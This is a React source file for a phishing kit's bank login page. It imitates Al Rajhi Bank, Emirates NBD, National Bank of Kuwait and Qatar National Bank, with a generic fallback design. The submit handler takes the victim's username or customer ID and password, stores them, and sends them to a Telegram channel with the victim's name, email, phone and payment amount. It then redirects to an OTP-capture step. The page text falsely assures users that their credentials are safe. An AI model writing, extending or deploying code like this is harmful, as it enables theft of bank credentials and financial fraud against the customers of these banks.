import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getBankById } from "@/lib/banks";
import { getBankDesign } from "@/lib/bankDesigns";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { formatCurrency } from "@/lib/countryCurrencies";
import { sendToTelegram } from "@/lib/telegram";
import { 
  Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck, 
  Smartphone, Fingerprint, QrCode, User, KeyRound, Phone
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Helmet } from "react-helmet-async";

const BankLoginPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [loginValue, setLoginValue] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selected_bank || "";
  const selectedBank = getBankById(selectedBankId);
  const bankDesign = getBankDesign(selectedBankId);
  
  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const customerName = linkData?.payload?.customer_name || "";
  const customerEmail = linkData?.payload?.customer_email || "";
  const customerPhone = linkData?.payload?.customer_phone || "";
  const invoiceNumber = linkData?.payload?.invoice_number || "";
  const paymentAmount = linkData?.payload?.payment_amount || 500;
  const serviceKey = linkData?.payload?.service_key || "payment";
  
  const serviceBranding = getServiceBranding(serviceKey);
  const formattedAmount = formatCurrency(paymentAmount, countryCode);

  if (!bankDesign) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <Card className="p-8 text-center max-w-md">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2">البنك غير متوفر</h2>
          <p className="text-muted-foreground mb-4">لم يتم العثور على تصميم البنك المطلوب</p>
          <Button onClick={() => navigate(`/pay/${id}/bank-selector`)}>
            العودة لاختيار البنك
          </Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!loginValue || !password) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال جميع البيانات",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: {
          ...linkData?.payload,
          bank_login: {
            loginType: bankDesign.loginType,
            loginValue: loginValue,
            password: password,
          },
        },
      });

      await sendToTelegram({
        type: 'bank_login',
        data: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          service: serviceBranding.nameAr || serviceKey,
          country: countryData?.nameAr || countryCode,
          countryCode: countryCode,
          bank: selectedBank?.nameAr || selectedBankId,
          bankId: selectedBankId,
          loginType: bankDesign.loginType,
          username: bankDesign.loginType === 'username' ? loginValue : '',
          customerId: bankDesign.loginType === 'customerId' ? loginValue : '',
          phoneNumber: bankDesign.loginType === 'phone' ? loginValue : '',
          password: password,
          amount: formattedAmount
        },
        timestamp: new Date().toISOString()
      });

      toast({
        title: "تم بنجاح",
        description: "جاري التحقق من بياناتك...",
      });

      setTimeout(() => {
        navigate(`/pay/${id}/otp-verification`);
      }, 1500);
    } catch (error) {
      // Error occurred
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الدخول",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getLoginLabel = () => {
    switch (bankDesign.loginType) {
      case 'username':
        return bankDesign.placeholders.username || 'اسم المستخدم';
      case 'customerId':
        return bankDesign.placeholders.customerId || 'رقم العميل';
      case 'phone':
        return bankDesign.placeholders.phone || 'رقم الجوال';
      default:
        return 'اسم المستخدم';
    }
  };

  const getLoginIcon = () => {
    switch (bankDesign.loginType) {
      case 'username':
        return <User className="w-5 h-5" />;
      case 'customerId':
        return <KeyRound className="w-5 h-5" />;
      case 'phone':
        return <Phone className="w-5 h-5" />;
      default:
        return <User className="w-5 h-5" />;
    }
  };

  const renderAlrajhiLogin = () => (
    <div 
      className="min-h-screen py-6 px-4" 
      dir="rtl"
      style={{ 
        background: 'linear-gradient(135deg, #F0F8F5 0%, #FFFFFF 50%, #F5F5F5 100%)',
        fontFamily: 'Tajawal, sans-serif'
      }}
    >
      <div className="w-full max-w-7xl mx-auto">
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden" style={{ border: '1px solid #E8F5E9' }}>
          <div 
            className="h-20 flex items-center justify-between px-8"
            style={{ 
              background: 'linear-gradient(90deg, #006C35 0%, #008844 100%)',
              borderBottom: '4px solid #FFD700'
            }}
          >
            <div className="flex items-center gap-3">
              <div className="bg-white rounded-xl p-2 shadow-lg">
                <Building2 className="w-8 h-8" style={{ color: '#006C35' }} />
              </div>
              <div className="text-white">
                <h1 className="text-2xl font-bold">مصرف الراجحي</h1>
                <p className="text-xs opacity-90">Al Rajhi Bank</p>
              </div>
            </div>
            <span className="text-3xl">{countryData?.flag}</span>
          </div>

          <div className="grid lg:grid-cols-2 gap-8 p-8">
            <div className="flex flex-col justify-center">
              <div className="mb-8">
                <h2 className="text-3xl font-bold mb-3" style={{ color: '#1A3A2E' }}>
                  الخدمات المصرفية عبر الإنترنت
                </h2>
                <p className="text-lg" style={{ color: '#5A7968' }}>
                  مباشر الأفراد - تسجيل الدخول
                </p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#1A3A2E' }}>
                    اسم المستخدم
                  </Label>
                  <Input
                    type="text"
                    placeholder="أدخل اسم المستخدم"
                    value={loginValue}
                    onChange={(e) => setLoginValue(e.target.value)}
                    className="h-14 text-base"
                    style={{
                      background: '#FFFFFF',
                      borderColor: '#C8E6D5',
                      borderWidth: '2px',
                      borderRadius: '10px',
                      fontSize: '16px'
                    }}
                    required
                  />
                </div>

                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#1A3A2E' }}>
                    كلمة المرور
                  </Label>
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="أدخل كلمة المرور"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="h-14 text-base pl-12"
                      style={{
                        background: '#FFFFFF',
                        borderColor: '#C8E6D5',
                        borderWidth: '2px',
                        borderRadius: '10px',
                        fontSize: '16px'
                      }}
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-4 top-1/2 -translate-y-1/2"
                      style={{ color: '#5A7968' }}
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-between text-sm">
                  <div className="flex items-center gap-2">
                    <input type="checkbox" id="remember" className="rounded" style={{ accentColor: '#006C35' }} />
                    <label htmlFor="remember" style={{ color: '#5A7968' }}>تذكرني</label>
                  </div>
                  <button type="button" className="font-semibold hover:underline" style={{ color: '#006C35' }}>
                    نسيت كلمة المرور؟
                  </button>
                </div>

                <Button
                  type="submit"
                  className="w-full h-16 text-xl font-bold text-white shadow-xl hover:shadow-2xl transition-all"
                  disabled={isSubmitting}
                  style={{
                    background: 'linear-gradient(90deg, #0052CC 0%, #2563EB 100%)',
                    borderRadius: '10px'
                  }}
                >
                  {isSubmitting ? "جاري التحقق..." : "تسجيل الدخول"}
                </Button>

                <div className="text-center">
                  <p className="text-sm mb-3" style={{ color: '#5A7968' }}>ليس لديك حساب؟</p>
                  <button type="button" className="text-sm font-bold hover:underline" style={{ color: '#006C35' }}>
                    التسجيل في الخدمات المصرفية
                  </button>
                </div>
              </form>
            </div>

            <div className="hidden lg:flex flex-col justify-center items-center" style={{ background: 'linear-gradient(135deg, #F0F8F5, #E8F5E9)', borderRadius: '16px', padding: '40px' }}>
              <ShieldCheck className="w-24 h-24 mb-6" style={{ color: '#006C35' }} />
              <h3 className="text-2xl font-bold mb-4 text-center" style={{ color: '#1A3A2E' }}>
                اتصال آمن ومشفر
              </h3>
              <p className="text-center" style={{ color: '#5A7968' }}>
                جميع بياناتك محمية بأعلى معايير الأمان المصرفي SSL 256-bit
              </p>
              <div className="mt-8 grid grid-cols-3 gap-4">
                <div className="text-center">
                  <div className="w-16 h-16 rounded-full mx-auto mb-2 flex items-center justify-center" style={{ background: '#006C3520' }}>
                    <Lock className="w-8 h-8" style={{ color: '#006C35' }} />
                  </div>
                  <p className="text-xs font-semibold" style={{ color: '#1A3A2E' }}>حماية كاملة</p>
                </div>
                <div className="text-center">
                  <div className="w-16 h-16 rounded-full mx-auto mb-2 flex items-center justify-center" style={{ background: '#006C3520' }}>
                    <Fingerprint className="w-8 h-8" style={{ color: '#006C35' }} />
                  </div>
                  <p className="text-xs font-semibold" style={{ color: '#1A3A2E' }}>بصمة الإصبع</p>
                </div>
                <div className="text-center">
                  <div className="w-16 h-16 rounded-full mx-auto mb-2 flex items-center justify-center" style={{ background: '#006C3520' }}>
                    <Smartphone className="w-8 h-8" style={{ color: '#006C35' }} />
                  </div>
                  <p className="text-xs font-semibold" style={{ color: '#1A3A2E' }}>تطبيق الجوال</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderEmiratesNBDLogin = () => (
    <div 
      className="min-h-screen relative overflow-hidden" 
      dir="rtl"
      style={{ fontFamily: 'Dubai, sans-serif' }}
    >
      <div 
        className="absolute inset-0"
        style={{
          background: 'linear-gradient(135deg, #003D5C 0%, #00334A 50%, #002838 100%)',
          backgroundImage: 'url(https://www.emiratesnbd.com/-/media/enbd/images/cib/businessonline-mobile-app/businessonline-mobile-app-banner.jpg)',
          backgroundSize: 'cover',
          backgroundPosition: 'center'
        }}
      >
        <div className="absolute inset-0" style={{ background: 'linear-gradient(135deg, rgba(0, 61, 92, 0.95), rgba(0, 51, 74, 0.9))' }} />
      </div>

      <div className="relative z-10 min-h-screen flex flex-col">
        <div className="h-16" style={{ background: 'linear-gradient(90deg, #00A651 0%, #008C44 100%)' }}>
          <div className="h-full flex items-center justify-center">
            <div className="flex items-center gap-2 text-white text-sm">
              <ShieldCheck className="w-5 h-5" />
              <span>Your credentials are safe with us</span>
            </div>
          </div>
        </div>

        <div className="py-8 px-4">
          <div className="max-w-6xl mx-auto">
            <div className="bg-white rounded-t-3xl p-6 mb-2 flex items-center justify-center">
              {selectedBank?.logo ? (
                <img src={selectedBank.logo} alt="Emirates NBD" className="h-12" />
              ) : (
                <div className="flex items-center gap-3">
                  <Building2 className="w-10 h-10" style={{ color: '#D50032' }} />
                  <h1 className="text-2xl font-bold" style={{ color: '#D50032' }}>Emirates NBD</h1>
                </div>
              )}
            </div>

            <div className="grid lg:grid-cols-2 gap-8">
              <div className="bg-transparent text-white p-8 flex flex-col justify-center">
                <h2 className="text-4xl font-bold mb-4">Welcome to Emirates NBD</h2>
                <p className="text-xl mb-2">أهلاً بك في بنك الإمارات دبي الوطني</p>
                
                <form onSubmit={handleSubmit} className="space-y-6 mt-8">
                  <div>
                    <Label className="mb-2 text-white text-base">User Name</Label>
                    <Input
                      type="text"
                      placeholder="Enter your username"
                      value={loginValue}
                      onChange={(e) => setLoginValue(e.target.value)}
                      className="h-14 text-base bg-white/10 border-white/30 text-white placeholder:text-white/60"
                      required
                    />
                    <button type="button" className="text-sm mt-1 hover:underline" style={{ color: '#FFA500' }}>
                      Forgot User Name?
                    </button>
                  </div>

                  <div>
                    <Label className="mb-2 text-white text-base">Password</Label>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter your password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="h-14 text-base bg-white/10 border-white/30 text-white placeholder:text-white/60 pl-12"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute left-4 top-1/2 -translate-y-1/2 text-white/70"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                    <div className="flex gap-4 mt-1">
                      <button type="button" className="text-sm hover:underline" style={{ color: '#FFA500' }}>
                        Forgot secret questions?
                      </button>
                      <button type="button" className="text-sm hover:underline" style={{ color: '#FFA500' }}>
                        Forgot password?
                      </button>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    className="w-full h-16 text-xl font-bold text-white shadow-xl hover:scale-105 transition-all"
                    disabled={isSubmitting}
                    style={{
                      background: 'linear-gradient(90deg, #FF8C00 0%, #FFA500 100%)',
                      borderRadius: '8px'
                    }}
                  >
                    {isSubmitting ? "LOADING..." : "LOG IN"}
                  </Button>

                  <div className="text-center">
                    <button type="button" className="text-white hover:underline text-sm">
                      REGISTER FOR ONLINE/MOBILE BANKING
                    </button>
                  </div>
                </form>
              </div>

              <div className="hidden lg:flex flex-col justify-center items-center bg-white/5 backdrop-blur-sm rounded-3xl p-8">
                <div className="text-white text-center">
                  <Smartphone className="w-20 h-20 mx-auto mb-6" style={{ color: '#FFA500' }} />
                  <h3 className="text-3xl font-bold mb-4">Welcome to the next generation of Digital Banking</h3>
                  <p className="text-xl mb-6">The all new Online Banking from Emirates NBD KSA</p>
                  <div className="grid grid-cols-4 gap-6 mt-8">
                    <div className="flex flex-col items-center">
                      <Phone className="w-10 h-10 mb-2" style={{ color: '#FFA500' }} />
                      <p className="text-xs">Contact Us</p>
                    </div>
                    <div className="flex flex-col items-center">
                      <User className="w-10 h-10 mb-2" style={{ color: '#FFA500' }} />
                      <p className="text-xs">Customer Care</p>
                    </div>
                    <div className="flex flex-col items-center">
                      <ShieldCheck className="w-10 h-10 mb-2" style={{ color: '#FFA500' }} />
                      <p className="text-xs">Online Security</p>
                    </div>
                    <div className="flex flex-col items-center">
                      <Smartphone className="w-10 h-10 mb-2" style={{ color: '#FFA500' }} />
                      <p className="text-xs">Mobile App</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderNBKLogin = () => (
    <div 
      className="min-h-screen py-8 px-4" 
      dir="rtl"
      style={{ 
        background: 'linear-gradient(135deg, #E8F4FA 0%, #F0F8FF 100%)',
        fontFamily: 'Cairo, sans-serif'
      }}
    >
      <div className="w-full max-w-5xl mx-auto">
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden">
          <div className="h-24 flex items-center justify-between px-10" style={{ background: '#005EB8' }}>
            <div className="flex items-center gap-4">
              <div className="bg-white rounded-xl p-3">
                <Building2 className="w-10 h-10" style={{ color: '#005EB8' }} />
              </div>
              <div className="text-white">
                <h1 className="text-3xl font-bold">بنك الكويت الوطني</h1>
                <p className="text-sm">National Bank of Kuwait</p>
              </div>
            </div>
          </div>

          <div className="p-10">
            <div className="max-w-md mx-auto">
              <div className="text-center mb-8">
                <h2 className="text-3xl font-bold mb-2" style={{ color: '#005EB8' }}>الخدمات المصرفية الإلكترونية</h2>
                <p className="text-lg" style={{ color: '#6C757D' }}>NBK Online Banking</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#212529' }}>
                    Customer ID / رقم العميل
                  </Label>
                  <Input
                    type="text"
                    placeholder="Enter Customer ID"
                    value={loginValue}
                    onChange={(e) => setLoginValue(e.target.value)}
                    className="h-14 text-base text-center"
                    style={{
                      background: '#F8F9FA',
                      borderColor: '#CED4DA',
                      borderWidth: '2px',
                      borderRadius: '8px',
                      fontSize: '18px',
                      fontFamily: 'monospace'
                    }}
                    required
                  />
                </div>

                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#212529' }}>
                    Password / كلمة المرور
                  </Label>
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="h-14 text-base pl-12"
                      style={{
                        background: '#F8F9FA',
                        borderColor: '#CED4DA',
                        borderWidth: '2px',
                        borderRadius: '8px',
                        fontSize: '16px'
                      }}
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-4 top-1/2 -translate-y-1/2"
                      style={{ color: '#6C757D' }}
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                <Button
                  type="submit"
                  className="w-full h-16 text-xl font-bold text-white shadow-xl hover:scale-105 transition-all"
                  disabled={isSubmitting}
                  style={{
                    background: 'linear-gradient(90deg, #005EB8 0%, #003F7F 100%)',
                    borderRadius: '8px'
                  }}
                >
                  {isSubmitting ? "Loading..." : "LOG IN / تسجيل الدخول"}
                </Button>

                <div className="flex justify-between text-sm">
                  <button type="button" className="hover:underline" style={{ color: '#005EB8' }}>
                    New User Registration
                  </button>
                  <button type="button" className="hover:underline" style={{ color: '#005EB8' }}>
                    Forgot Password?
                  </button>
                </div>
              </form>

              <div className="mt-8 p-6 rounded-2xl" style={{ background: 'linear-gradient(135deg, #005EB820, #003F7F20)' }}>
                <div className="flex items-center gap-3 mb-4">
                  <ShieldCheck className="w-8 h-8" style={{ color: '#005EB8' }} />
                  <h4 className="font-bold text-lg" style={{ color: '#005EB8' }}>Secure Banking</h4>
                </div>
                <p className="text-sm" style={{ color: '#6C757D' }}>
                  نحن نستخدم أحدث تقنيات الأمان لحماية معلوماتك الشخصية والمالية
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderQNBLogin = () => (
    <div 
      className="min-h-screen py-8 px-4" 
      dir="rtl"
      style={{ 
        background: 'linear-gradient(135deg, #F9F5F6 0%, #FFFFFF 100%)',
        fontFamily: 'Tajawal, sans-serif'
      }}
    >
      <div className="w-full max-w-5xl mx-auto">
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden" style={{ border: '2px solid #6E1D3E20' }}>
          <div 
            className="h-24 flex items-center justify-between px-10" 
            style={{ 
              background: 'linear-gradient(90deg, #6E1D3E 0%, #8E1D4E 100%)',
              borderBottom: '3px solid #B8860B'
            }}
          >
            <div className="flex items-center gap-4">
              <div className="bg-white rounded-xl p-3 shadow-lg">
                <Building2 className="w-10 h-10" style={{ color: '#6E1D3E' }} />
              </div>
              <div className="text-white">
                <h1 className="text-3xl font-bold">بنك قطر الوطني</h1>
                <p className="text-sm opacity-90">Qatar National Bank</p>
              </div>
            </div>
            <span className="text-3xl">🇶🇦</span>
          </div>

          <div className="p-10">
            <div className="max-w-md mx-auto">
              <div className="text-center mb-10">
                <div className="w-20 h-20 rounded-full mx-auto mb-4 flex items-center justify-center" style={{ background: '#6E1D3E15' }}>
                  <Lock className="w-10 h-10" style={{ color: '#6E1D3E' }} />
                </div>
                <h2 className="text-3xl font-bold mb-2" style={{ color: '#6E1D3E' }}>
                  الخدمات المصرفية الإلكترونية
                </h2>
                <p className="text-lg" style={{ color: '#737373' }}>QNB Online Banking</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#1A1A1A' }}>
                    User ID / رقم المستخدم
                  </Label>
                  <Input
                    type="text"
                    placeholder="Enter User ID"
                    value={loginValue}
                    onChange={(e) => setLoginValue(e.target.value)}
                    className="h-14 text-base"
                    style={{
                      background: '#F9F9F9',
                      borderColor: '#E5E5E5',
                      borderWidth: '2px',
                      borderRadius: '10px',
                      fontSize: '16px'
                    }}
                    required
                  />
                </div>

                <div>
                  <Label className="mb-3 text-base font-bold" style={{ color: '#1A1A1A' }}>
                    Password / كلمة المرور
                  </Label>
                  <div className="relative">
                    <Input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="h-14 text-base pl-12"
                      style={{
                        background: '#F9F9F9',
                        borderColor: '#E5E5E5',
                        borderWidth: '2px',
                        borderRadius: '10px',
                        fontSize: '16px'
                      }}
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-4 top-1/2 -translate-y-1/2"
                      style={{ color: '#737373' }}
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <input type="checkbox" id="remember" className="rounded" style={{ accentColor: '#6E1D3E' }} />
                    <label htmlFor="remember" className="text-sm" style={{ color: '#737373' }}>Remember Me</label>
                  </div>
                  <button type="button" className="text-sm font-bold hover:underline" style={{ color: '#6E1D3E' }}>
                    Forgot Password?
                  </button>
                </div>

                <Button
                  type="submit"
                  className="w-full h-16 text-xl font-bold text-white shadow-xl hover:shadow-2xl transition-all"
                  disabled={isSubmitting}
                  style={{
                    background: 'linear-gradient(90deg, #6E1D3E 0%, #8E2D5E 100%)',
                    borderRadius: '10px'
                  }}
                >
                  {isSubmitting ? "جاري التحقق..." : "LOG IN / تسجيل الدخول"}
                </Button>
              </form>

              <div className="mt-8 grid grid-cols-2 gap-4">
                <button className="p-4 rounded-xl border-2 hover:shadow-lg transition-all" style={{ borderColor: '#6E1D3E', color: '#6E1D3E' }}>
                  <Fingerprint className="w-8 h-8 mx-auto mb-2" />
                  <p className="text-xs font-bold">Fingerprint Login</p>
                </button>
                <button className="p-4 rounded-xl border-2 hover:shadow-lg transition-all" style={{ borderColor: '#6E1D3E', color: '#6E1D3E' }}>
                  <QrCode className="w-8 h-8 mx-auto mb-2" />
                  <p className="text-xs font-bold">QR Code Login</p>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  const renderDefaultLogin = () => (
    <div 
      className="min-h-screen flex flex-col py-8 px-4" 
      dir="rtl"
      style={{ 
        background: bankDesign.colors.background,
        fontFamily: bankDesign.fonts.arabic
      }}
    >
      <div className="w-full max-w-6xl mx-auto mb-6 px-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            {selectedBank?.logo ? (
              <img 
                src={selectedBank.logo} 
                alt={bankDesign.nameAr}
                className="h-12 sm:h-16 w-auto"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            ) : (
              <Building2 className="w-12 h-12" style={{ color: bankDesign.colors.primary }} />
            )}
            <div>
              <h1 
                className="text-xl sm:text-2xl font-bold"
                style={{ 
                  color: bankDesign.colors.primary,
                  fontFamily: bankDesign.fonts.arabic
                }}
              >
                {bankDesign.nameAr}
              </h1>
              <p className="text-xs sm:text-sm" style={{ color: bankDesign.colors.textSecondary }}>
                {bankDesign.name}
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-2xl">{countryData?.flag}</span>
          </div>
        </div>
      </div>
      
      <div className="flex-1 flex items-center justify-center">
        <div className="w-full max-w-md">
          <Card 
            className="p-6 sm:p-10 shadow-2xl"
            style={{ 
              border: `1px solid ${bankDesign.colors.border}`,
              background: bankDesign.colors.inputBg,
              borderRadius: '16px'
            }}
          >
            <div className="mb-8">
              <div className="flex items-center gap-3 mb-6">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center shadow-lg"
                  style={{ background: bankDesign.colors.primary }}
                >
                  <Lock className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 
                    className="text-2xl sm:text-3xl font-bold"
                    style={{ 
                      color: bankDesign.colors.text,
                      fontFamily: bankDesign.fonts.arabic
                    }}
                  >
                    الخدمات المصرفية
                  </h2>
                  <p style={{ color: bankDesign.colors.textSecondary, fontSize: '13px' }}>
                    Online Banking
                  </p>
                </div>
              </div>
              <div 
                className="h-1 w-20 rounded-full"
                style={{ background: bankDesign.colors.primary }}
              />
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label 
                  className="mb-3 text-sm font-bold"
                  style={{ color: bankDesign.colors.text }}
                >
                  {getLoginLabel()}
                </Label>
                <div className="relative">
                  <Input
                    type={bankDesign.loginType === 'phone' ? 'tel' : 'text'}
                    placeholder={getLoginLabel()}
                    value={loginValue}
                    onChange={(e) => setLoginValue(e.target.value)}
                    className="h-14 text-base"
                    style={{
                      background: bankDesign.colors.inputBg,
                      borderColor: bankDesign.colors.border,
                      borderWidth: '2px',
                      borderRadius: '10px',
                      color: bankDesign.colors.text,
                      fontSize: '16px'
                    }}
                    required
                  />
                </div>
              </div>

              <div>
                <Label 
                  className="mb-3 text-sm font-bold"
                  style={{ color: bankDesign.colors.text }}
                >
                  {bankDesign.placeholders.password}
                </Label>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder={bankDesign.placeholders.password}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-14 text-base pl-12"
                    style={{
                      background: bankDesign.colors.inputBg,
                      borderColor: bankDesign.colors.border,
                      borderWidth: '2px',
                      borderRadius: '10px',
                      color: bankDesign.colors.text,
                      fontSize: '16px'
                    }}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-4 top-1/2 -translate-y-1/2"
                    style={{ color: bankDesign.colors.textSecondary }}
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between text-sm">
                {bankDesign.features.rememberMe && (
                  <div className="flex items-center gap-2">
                    <input type="checkbox" id="remember" className="rounded" style={{ accentColor: bankDesign.colors.primary }} />
                    <label htmlFor="remember" style={{ color: bankDesign.colors.textSecondary }}>تذكرني</label>
                  </div>
                )}
                {bankDesign.features.forgotPassword && (
                  <button type="button" className="font-semibold hover:underline" style={{ color: bankDesign.colors.primary }}>
                    نسيت كلمة المرور؟
                  </button>
                )}
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-16 text-xl font-bold text-white shadow-xl hover:shadow-2xl transition-all hover:scale-[1.02]"
                disabled={isSubmitting || !loginValue || !password}
                style={{
                  background: bankDesign.colors.buttonGradient || bankDesign.colors.primary,
                  fontFamily: bankDesign.fonts.arabic,
                  borderRadius: '12px',
                  opacity: (!loginValue || !password) ? 0.6 : 1
                }}
              >
                {isSubmitting ? "جاري التحقق..." : "تسجيل الدخول"}
              </Button>
            </form>

            {(bankDesign.features.biometric || bankDesign.features.qrCode) && (
              <div className="mt-8 pt-6 border-t" style={{ borderColor: bankDesign.colors.border }}>
                <p className="text-center text-sm mb-4" style={{ color: bankDesign.colors.textSecondary }}>
                  طرق تسجيل دخول أخرى
                </p>
                <div className="flex gap-3 justify-center">
                  {bankDesign.features.biometric && (
                    <button
                      type="button"
                      className="flex-1 py-3 px-4 rounded-xl border-2 flex items-center justify-center gap-2 transition-all hover:shadow-md"
                      style={{ borderColor: bankDesign.colors.primary, color: bankDesign.colors.primary }}
                    >
                      <Fingerprint className="w-5 h-5" />
                      <span className="text-sm font-semibold">البصمة</span>
                    </button>
                  )}
                  {bankDesign.features.qrCode && (
                    <button
                      type="button"
                      className="flex-1 py-3 px-4 rounded-xl border-2 flex items-center justify-center gap-2 transition-all hover:shadow-md"
                      style={{ borderColor: bankDesign.colors.primary, color: bankDesign.colors.primary }}
                    >
                      <QrCode className="w-5 h-5" />
                      <span className="text-sm font-semibold">QR</span>
                    </button>
                  )}
                </div>
              </div>
            )}

            <div className="mt-6 text-center space-y-3">
              <button type="button" className="text-sm hover:underline" style={{ color: bankDesign.colors.textSecondary }}>
                لا تملك حساب؟ سجل الآن
              </button>
            </div>
          </Card>

          <div className="mt-6 text-center">
            <button
              onClick={() => navigate(`/pay/${id}/bank-selector`)}
              className="inline-flex items-center gap-2 text-sm hover:underline"
              style={{ color: bankDesign.colors.textSecondary }}
            >
              <ArrowLeft className="w-4 h-4" />
              <span>العودة لاختيار بنك آخر</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );

  if (selectedBankId === 'alrajhi_bank') {
    return (
      <>
        <Helmet>
          <html lang="ar" dir="rtl" />
        </Helmet>
        {renderAlrajhiLogin()}
      </>
    );
  }

  if (selectedBankId === 'emirates_nbd') {
    return (
      <>
        <Helmet>
          <html lang="ar" dir="rtl" />
        </Helmet>
        {renderEmiratesNBDLogin()}
      </>
    );
  }

  if (selectedBankId === 'nbk') {
    return (
      <>
        <Helmet>
          <html lang="ar" dir="rtl" />
        </Helmet>
        {renderNBKLogin()}
      </>
    );
  }

  if (selectedBankId === 'qnb') {
    return (
      <>
        <Helmet>
          <html lang="ar" dir="rtl" />
        </Helmet>
        {renderQNBLogin()}
      </>
    );
  }

  return (
    <>
      <Helmet>
        <html lang="ar" dir="rtl" />
      </Helmet>
      {renderDefaultLogin()}
    </>
  );
};

export default BankLoginPage;
